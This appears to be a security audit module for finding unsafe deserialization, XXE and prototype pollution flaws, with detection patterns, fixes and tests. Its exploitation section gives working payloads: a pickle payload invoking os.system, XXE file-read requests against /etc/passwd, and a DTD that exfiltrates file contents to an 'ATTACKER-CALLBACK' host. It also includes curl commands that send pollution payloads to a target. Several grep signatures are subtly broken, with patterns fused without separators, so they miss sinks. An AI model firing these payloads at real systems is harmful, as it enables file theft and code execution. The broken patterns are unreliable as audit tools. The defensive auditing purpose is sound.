---
name: deserialization-checks
description: Detect unsafe deserialization of untrusted data (native serializers, XXE, YAML, prototype pollution) across all major languages.
category_slug: DESER
cwe: [CWE-502, CWE-611, CWE-1321]
owasp: A08:2021 – Software and Data Integrity Failures
---

# Check Module DESER — Deserialization & Object Injection

## Scope & Objectives

Find every place where untrusted data (network input, message queues, files,
cookies, cache entries) is converted back into executable objects or rich data
structures, and determine whether an attacker can abuse that conversion to:

1. Execute code (native deserialization gadget chains),
2. Read files or reach internal services (XXE),
3. Alter application logic without code execution (prototype pollution,
   object injection, type confusion).

Covered here: native object serialization (pickle, Java, .NET, PHP, Ruby),
XML parsing incl. external entities (XXE), YAML loading, and server-side
JavaScript prototype pollution. Out of scope (cross-referenced): mass
assignment (API), SSRF from URL fetchers (SSRF), decompression/entity-bomb
resource math (DOS), JWT/token integrity (AUTHN).

## Prerequisites & Vocabulary

Zero-background primer: the terms this module uses, one line each. Deeper plain-language
explanations for every class live in the repository GUIDE.md glossary.

- **deserialization**: turning raw bytes (network data, files, cookies) back into live program objects
- **gadget chain**: a sequence of ordinary classes an attacker chains so object construction ends up running their code
- **XXE**: an XML feature that resolves external references, reading local files or calling internal URLs
- **prototype pollution**: JavaScript trick adding keys like `__proto__` that change object behavior across the whole app
- **integrity check before parse**: verifying a signature on the blob BEFORE handing it to the parser
- **type confusion**: bytes parsed as the wrong structure, so the program reasons about the wrong thing
- **taint flow / source→sink**: path untrusted data travels from entry point to dangerous function
- **finding status**: Confirmed > Probable > Needs-Review; evidence rules in templates/finding-report.md

## Mental Model

Deserialization bugs follow one shape:

```
Untrusted bytes --> parser that CONSTRUCTS OBJECTS or RESOLVES REFERENCES --> side effects
     |                                       |
     |                                       +- constructors, magic methods,
     +- attacker fully controls bytes           class lookups, entity resolution,
        (no signature/AEAD verified first)      prototype traversal = attack surface
```

Three escalating risk tiers:

| Tier | Mechanism | Typical outcome |
|---|---|---|
| T1 | Object instantiation driven by attacker bytes | RCE via gadget chains |
| T2 | External entity / reference resolution | File read, SSRF, DoS |
| T3 | Key/path traversal inside plain structures | Logic bypass, pollution |

Key insight for auditors: the serializer alone is rarely the vulnerability.
The missing **integrity check before parse** and the **classes reachable during
parse** are what make it exploitable. A signed blob fed to `pickle.loads` is far
less exploitable than an unsigned one; `pickle.loads` running in an app whose
namespace exposes rich classes (e.g., Django) is riskier than one in a tiny CLI.

## What To Check

- [ ] Enumerate ALL deserialization sinks using Patterns & Signatures below.
- [ ] For each sink, trace input origin: request body? header? cookie? queue
      message? uploaded file? DB row written elsewhere? config file?
- [ ] For each reachable sink, verify integrity controls: is HMAC/signature or
      AEAD verification performed BEFORE the parse call, with a server-only key?
- [ ] Distinguish signing from tamper-proofing: an HMAC still leaks content and
      collapses if the secret leaks; only verification over the exact serialized
      bytes before parsing meaningfully reduces risk.
- [ ] XML: confirm EVERY parser disables external entities (exact flags in
      Remediation). One unprotected parser is enough for exploitation.
- [ ] YAML: any `yaml.load(` without explicit `Loader=SafeLoader`/`CSafeLoader`.
- [ ] Node.js: deep-merge calls (`merge`, `extend`, `defaultsDeep`, `set`,
      `deepmerge`) fed from JSON bodies; query parsers with bracket/array
      expansion; `Object.assign` config updates from request data.
- [ ] Reflection: class/type names derived from input (`getattr`,
      `Class.forName`, `Activator.CreateInstance`, PHP variable class
      instantiation, Python `importlib.import_module(variable)`).
- [ ] Session/cache stores: which serializer backs them (pickle-backed Django
      sessions/caches, Ruby Marshal cookies, PHP serialize handlers)?
- [ ] Background jobs: workers deserializing broker payloads natively (Celery
      pickle protocol, JMS ObjectMessage, custom Marshal formats).
- [ ] Import/export features ("restore backup", "migrate", "bulk import") that
      parse user-supplied structured files server-side.

## Where To Look

High-yield locations, in priority order:

1. **API handlers accepting structured blobs**: endpoints taking base64/hex
   fields named "payload", "data", "state", "export", "session", "token".
2. **Upload processors parsing documents server-side** (Office/XML/YAML imports,
   SVG, project-file imports).
3. **Webhook receivers parsing XML/SOAP** (legacy integrations are common XXE homes).
4. **Job/queue consumers**: `tasks.py`, `worker.js`, `*Consumer.java`, `app/jobs/*`.
5. **Cookie/session decode paths** and "remember me" token handling.
6. **Import/export features**: restore, migrate, bulk import, backup upload.
7. **Config/bootstrap loaders** reading `.yaml/.yml/.xml` where users influence
   path or content (multi-tenant theme/plugin uploads especially).

Entry-point context markers:

```regex
@(post|put|patch)\(.*(import|upload|restore|webhook|parse)
def .*(webhook|import|restore|migrate)\(
@RequestMapping.*consumes.*(xml|octet-stream)
\[HttpPost\].*(Import|Upload|Webhook)
```

## Patterns & Signatures

### Native serializer sinks (T1 — highest priority)

| Language | Dangerous sink | Risk if tainted | Safe replacement |
|---|---|---|---|
| Python | `pickle.loads` / `pickle.load` / `cPickle` / `_pickle` | Critical | JSON + schema |
| Python | `yaml.load(...)` without SafeLoader | Critical–High | `yaml.safe_load` |
| Python | `shelve.open` on user-influenced file | High | sqlite/JSON |
| Java/Kotlin | `ObjectInputStream.readObject` | Critical | JSON/protobuf |
| Java/Kotlin | `XMLDecoder.decode` / `.readObject()` | Critical | remove feature |
| Java/Kotlin | `XStream.fromXML` (old defaults) | Critical–High | JSON driver + type allowlist |
| C# | `BinaryFormatter.Deserialize` | Critical | System.Text.Json |
| C# | `NetDataContractSerializer`, `ObjectStateFormatter`, `LosFormatter` | Critical–High | DataContractSerializer w/ safe settings |
| PHP | `unserialize($user_input)` | Critical–High | `json_decode` |
| Ruby | `Marshal.load` on external data | Critical–High | JSON |
| Node | `node-serialize`, func-token evals, re-eval of `serialize-javascript` output | Critical | JSON |

Ripgrep signature blocks (no lookaheads; manual-filter notes included):

```regex
pickle\.loads?\(|cPickle\.loads?|_pickle\.loads?|shelve\.open\(yaml\.load\(|yaml\.unsafe_load|
```

Run the YAML half separately and manually drop hits containing
`Loader=SafeLoader`, `Loader=CSafeLoader`, or `safe_load`:

```regex
yaml\.load\(|yaml\.unsafe_load|load\([^)]*FullLoader
```

```regex
ObjectInputStream|XMLDecoder|XStream|fromXML\(|BinaryFormatter|NetDataContractSerializer|ObjectStateFormatter|LosFormatterunserialize\s*\(|Marshal\.load|node-serialize|eval\(.*serialize
```

Blob-format recognition in code/data (helps confirm what a sink expects):

| Format | Marker |
|---|---|
| Python pickle (protocol 2+) | bytes `\x80\x02` … `\x80\x05`; ASCII ops like `cos\nsystem` |
| Java serialization | hex `AC ED 00 05` (`rO0AB…` base64) |
| .NET BinaryFormatter | base64 prefix `AAEAAAD/////` |
| PHP | `O:<len>:"ClassName":<n>:{…}` |
| Ruby Marshal | `x04x08` then class symbols |

### XML / XXE sinks (T2)

| Parser | Unsafe default | Required hardening |
|---|---|---|
| Python `lxml.etree` | resolves entities, fetches network DTDs | `resolve_entities=False`, `no_network=True`; prefer defusedxml |
| Python `xml.etree.ElementTree` | rejects entity definitions since 3.7.1; old versions vary | use `defusedxml.ElementTree` for untrusted input |
| Python `xml.sax` | external general entities resolvable | features per Remediation table |
| Java `DocumentBuilderFactory` | entities ON | 3-feature set below + `setExpandEntityReferences(false)` + `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` |
| Java `SAXParserFactory` | entities ON | same feature set |
| .NET `XmlReader.Create` | secure by default (DTD prohibited) | never legacy `new XmlTextReader(...)` path; keep DTDProcessing=Prohibit for untrusted |
| PHP `DOMDocument`/`simplexml` | libxml >=2.9 blocks network entities by default | verify libxml version; older stacks need loader disable |
| Go `encoding/xml` | no entity expansion | low risk — state it and move on |

Signatures:

```regex
etree\.parse\(|etree\.fromstring\(|xml\.sax|DocumentBuilderFactory|SAXParserFactory|XmlTextReader|simplexml_load|DOMDocument|XMLReader|SAXReader
```

XXE payload templates for reproduction:

```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

```xml
<?xml version="1.0"?><!DOCTYPE r [
  <!ENTITY % d SYSTEM "http://ATTACKER-CALLBACK/x.dtd">
  %d;]><r>send</r>
```

with `x.dtd` hosted at attacker: `<!ENTITY % f SYSTEM "file:///etc/hostname"><!ENTITY % s "<!ENTITY o '%f;'>">%s;` — concept only; build during authorized testing.

### Prototype pollution (Node, T3)

Sink/marker signatures:

```regex
lodash.*(merge|mergeWith|setWith|defaultsDeep|zipObjectDeep)|deepmerge|deep-extend|merge-deep|defaults-deep|object-path|\bextend\(
qs\(|extended:\s*true|simple-parser__proto__|constructor\[.prototype.\]|constructor\.prototype
```

Vulnerable shape and fix:

```javascript
// VULNERABLE - user JSON merged into config object
const { merge } = require('lodash');
app.post('/api/settings', (req, res) => {
  merge(defaultSettings, req.body);   // {"__proto__":{"isAdmin":true}}
  res.json({ ok: true });             // EVERY plain object now has isAdmin=true
});
```

```javascript
// FIXED - structural keys stripped recursively before any merge
const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
function sanitize(value) {
  if (Array.isArray(value)) return value.map(sanitize);
  if (value && typeof value === 'object') {
    const out = {};
    for (const [k, v] of Object.entries(value))
      if (!BLOCKED.has(k)) out[k] = sanitize(v);
    return out;
  }
  return value;
}
app.post('/api/settings', (req, res) => {
  merge(defaultSettings, sanitize(req.body));
  res.json({ ok: true });
});
```

Also check `qs` usage: bracket notation (`?a[__proto__][x]=1`) historically fed
pollution via `extended: true` bodies on vulnerable library versions.

### Reflection-driven object injection

```regex
getattr\([a-z_]+,\s*[a-z_.]*(request|params|args|input)|Class\.forName\(Activator\.CreateInstance|Type\.GetType\(\$|new \$[A-Za-z_]|call_user_func(_array)?\(|import_module\([^'"]
```

```php
// VULNERABLE - class chosen straight from request
$handler = new $_POST['report_type']();     // arbitrary constructor invocation
// FIXED - allowlist map
$allowed = ['pdf' => PdfReport::class, 'csv' => CsvReport::class];
$cls = $allowed[$_POST['report_type']] ?? null;
if ($cls === null) { http_response_code(400); exit; }
$handler = new $cls();
```

## Taint Tracing Guidance

**Sources (TAINTED):** `req.body`/JSON payloads, form fields, headers (incl.
`X-*` metadata), cookies, query strings, uploaded file CONTENT (not just the
name), queue/broker messages, webhook bodies, third-party API responses stored
then re-parsed later, values read from caches another component writes.

**Propagators:** base64/hex decode helpers (`Buffer.from`, `b64decode`,
`Convert.FromBase64String`), temp files, ORM round-trips of tainted columns
(second-order flows: blob stored in one request, deserialized in another — grep
the write sites too), archive entry contents.

**Real sanitizers (safe to credit):**
- HMAC/asymmetric signature verified over the EXACT serialized bytes BEFORE parse;
- AEAD encryption with auth tag enforced before decrypt-output is parsed;
- schema validation rejecting unknown keys and constraining types before merges;
- XML parsers configured with the exact hardening flags from Remediation.

**Fake sanitizers (do NOT credit):** try/catch around the load; length limits
alone; `is_string`/type-hint checks; base64 encoding (transport, not integrity);
signature verification performed AFTER parsing; blocklists of class names.

**Reachability questions to answer per sink:**
1. Can an external actor control these bytes directly or via stored data?
2. Which classes/modules are importable at parse time (gadget richness)?
3. Is there any integrity gate upstream? Trace order of operations literally.

## Exploitation & Reproduction

Reproduce benignly: payloads below prove control WITHOUT destructive actions.
Never fire weaponized gadget chains at systems without explicit authorization;
marker-file / env-dump proofs are sufficient for reports.

### 1. Python pickle — local proof-of-control

```bash
# Payload that ONLY writes $USER into /tmp/deser_proof.txt (benign proof)
python3 - <<'EOF'
import pickle
class P:
    def __reduce__(self):
        import os
        return os.system, ("echo $USER > /tmp/deser_proof.txt",)
open('/tmp/payload.bin','wb').write(pickle.dumps(P()))
EOF
# In a LOCAL test harness: pickle.loads(open('/tmp/payload.bin','rb').read())
# Expected observable: /tmp/deser_proof.txt appears => arbitrary code path proven.
```

Static-only confirmation: sink reachable from request input + no integrity gate
= Confirmed under this rubric even without firing anything.

### 2. XXE file read

```bash
curl -s -H "Content-Type: application/xml" \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>' \
  https://TARGET/api/import
# Expected observable: response contains "root:x:0:0", or a parser error that
# reveals entity processing behavior.
```

Blind-response variant: point the DTD template at an attacker-controlled
DNS/HTTP callback you are authorized to monitor; expected observable: inbound
lookup during request processing.

### 3. Server-side prototype pollution

```bash
curl -X POST https://TARGET/api/settings -H 'Content-Type: application/json' \
  -d '{"__proto__":{"pollutedFlag":"DESER-PROOF"}}'
# Then hit ANY endpoint reflecting object properties:
curl -s https://TARGET/api/config | grep -o 'pollutedFlag[^,}]*'
# Expected observable: DESER-PROOF surfaces in output or changes behavior.
```

If nothing reflects it, pollution may still exist but impact is unproven ->
status Probable with explicit reasoning.

### 4. PHP object injection

1. Read target code; list classes whose magic methods (`__wakeup`,
   `__destruct`, `__toString`, `__call`) perform writes/deletes/queries.
2. Craft `O:<len>:"<ClassName>":<n>:{...}` matching real property names.
3. Submit through any parameter reaching `unserialize()`.
4. Expected observable: the side effect defined in the magic method occurs
   (log entry, cache key removed) => instantiation proven.

### 5. Java/.NET blob tampering (no gadget execution)

Modify field values inside a legitimately obtained serialized blob and resend;
expected observable: server accepts altered state => integrity controls absent =>
document as Critical-tier without executing any gadgets.

## Remediation

**Decision tree:**
1. Can this data be plain JSON + schema validation? Do that — eliminates T1/T3.
2. Rich objects genuinely required from semi-trusted sources? Sign/AEAD the EXACT
   bytes before storage/transit; verify BEFORE parse; keep keys server-side.
3. Native serializers on external data: replace regardless of filters; class
   allowlists (e.g., `resolveClass` overrides) reduce but never eliminate risk.

**Integrity ordering rule:** verify-then-parse, never parse-then-inspect.

**XXE hardening flags (exact names):**

| Parser | Required configuration |
|---|---|
| Java DocumentBuilderFactory | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; `setFeature("http://xml.org/sax/features/external-general-entities", false)`; `setFeature("http://xml.org/sax/features/external-parameter-entities", false)`; `setXIncludeAware(false)`; `setExpandEntityReferences(false)` |
| Java SAXParserFactory | same feature URIs via `setFeature` on the factory |
| Python lxml | `etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`; prefer defusedxml wrappers for untrusted input |
| .NET | `new XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit, XmlResolver = null }` |
| PHP | require libxml >= 2.9 (network entities blocked); legacy stacks disable entity loader before parse |

**Prototype pollution defenses:** recursive structural-key stripping at every
merge boundary (snippet above); prefer `Object.create(null)` or `Map` for
attacker-keyed stores; keep `qs`/body parsers patched; avoid `extended:true`
query parsing unless needed; evaluate runtime hardening flags where supported.

**Native-deserialization replacements (before/after):**

```python
# VULNERABLE
state = pickle.loads(base64.b64decode(req.data))
# FIXED
state = StateSchema().loads(base64.b64decode(req.data))  # JSON + schema
```

```java
// VULNERABLE
Object o = new ObjectInputStream(in).readObject();
// FIXED
MyDto dto = objectMapper.readValue(in, MyDto.class);
```

```csharp
// VULNERABLE
var o = new BinaryFormatter().Deserialize(stream);
// FIXED
var o = await JsonSerializer.DeserializeAsync<MyDto>(stream);
```

```php
// VULNERABLE
$o = unserialize($input);
// FIXED
$o = json_decode($input, true, 512, JSON_THROW_ON_ERROR);
```

```ruby
# VULNERABLE
obj = Marshal.load(raw)
# FIXED
obj = JSON.parse(raw)
```

```javascript
// VULNERABLE
const obj = eval('(' + payload + ')');
// FIXED
const obj = JSON.parse(payload); // then validate against schema
```

Defense-in-depth: least-privilege workers so gadget side effects fail closed;
alerting on deserializer exceptions (attack noise); patched serializer libraries;
egress rules blocking surprise outbound lookups from parsers.

## Verification & Validation

GIVEN/WHEN/THEN suites to add:

```text
GIVEN a pickled payload with os.system reduce WHEN submitted to the state endpoint
THEN server responds 400 and NO side effect occurs (marker file absent)

GIVEN XML containing an external entity WHEN parsed by the import endpoint
THEN response contains no file content and parser logs a rejected-doctype error

GIVEN JSON body {"__proto__":{"x":1}} WHEN merged into settings
THEN Object.keys(settings.__proto__) shows no x AND config output lacks x

GIVEN a legitimate previously-stored blob WHEN loaded
THEN parsing succeeds unchanged (negative control: functionality intact)
```

Regression-test pseudocode (framework-agnostic):

```text
test_rejects_native_deserialization_payloads:
  for payload in [pickle_rce_probe, java_magic_hex, php_0_syntax, dotnet_marker]:
    resp = send(parse_endpoint, payload)
    assert not resp.caused_side_effect and resp.status in (400, 415, 422)

test_xxe_blocked:
  resp = send(xml_endpoint, xxe_file_read_template)
  assert "root:x:0" not in resp.body

test_proto_pollution_resistant:
  send(merge_endpoint, {"__proto__": {"canary": 1}})
  assert reflect(canary) == absent
```

Manual re-test checklist:
- [ ] Every former sink now uses safe parser/format or verified integrity first
- [ ] Negative controls pass (legitimate blobs/XML still processed)
- [ ] Grep sweep below returns zero unreviewed hits
- [ ] Workers/consumers included, not just HTTP handlers

Re-scan greps post-fix (same patterns as Patterns & Signatures):

```regex
pickle\.loads?\(|unserialize\s*\(|Marshal\.load\(|BinaryFormatter|ObjectInputStream|XMLDecoder
yaml\.load\(disallow-doctype-decl|external-general-entities|DtdProcessing|SafeLoader
__proto__|constructor\.prototype
```

## Severity Assessment

| Instance | CWE | Typical CVSS v3.1 vector | Band |
|---|---|---|---|
| Network-reachable native deser, no integrity check | CWE-502 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Critical |
| Internal-only deser sink (service mesh) | CWE-502 | AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | High |
| XXE arbitrary file read | CWE-611 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | High |
| XXE blind/OOB only | CWE-611 | AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N | Medium–High |
| Proto pollution w/o demonstrated impact path | CWE-1321 | AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L | Medium–High |
| Reflection class instantiation, allowlistable | CWE-470 | context-dependent | Medium |

Rubric anchors: attacker-controlled bytes + object construction = start Critical;
strip severity only for proven integrity gates, unreachable sources, or empty
gadget surface (document which classes ARE reachable when claiming low risk).

## Common False Positives

- **Internal-only serializers** between two trusted services on a private mesh
  with mTLS — downgrade, document trust boundary, do not delete finding silently.
- **JSON.parse everywhere** — plain JSON decoding is NOT deserialization risk
  (except proto-pollution merges); do not flag standard REST handlers.
- **Pickle of app-generated data only** with no user influence anywhere upstream
  (verify the WHOLE chain incl. admin tools and cron inputs).
- **Go encoding/xml** — no entity expansion; XXE templates simply do not apply.
- **Schema-validated merges** rejecting unknown keys already block pollution —
  confirm validation runs BEFORE merge, not after.
- **Signed cookies** (e.g., itsdangerous): signature prevents blind tampering;
  flag only if secret strength/source is questionable (cross-ref SECRETS/AUTHN).

## References

- CWE-502: Deserialization of Untrusted Data — https://cwe.mitre.org/data/definitions/502.html
- CWE-611: Improper Restriction of XML External Entity Reference — https://cwe.mitre.org/data/definitions/611.html
- CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') — https://cwe.mitre.org/data/definitions/1321.html
- OWASP Cheat Sheet: Deserialization — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- OWASP Cheat Sheet: XML External Entity Prevention — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet: Prototype Pollution Prevention — https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html
- OWASP ASVS 5.x section V5 (Validation, Sanitization and Encoding)
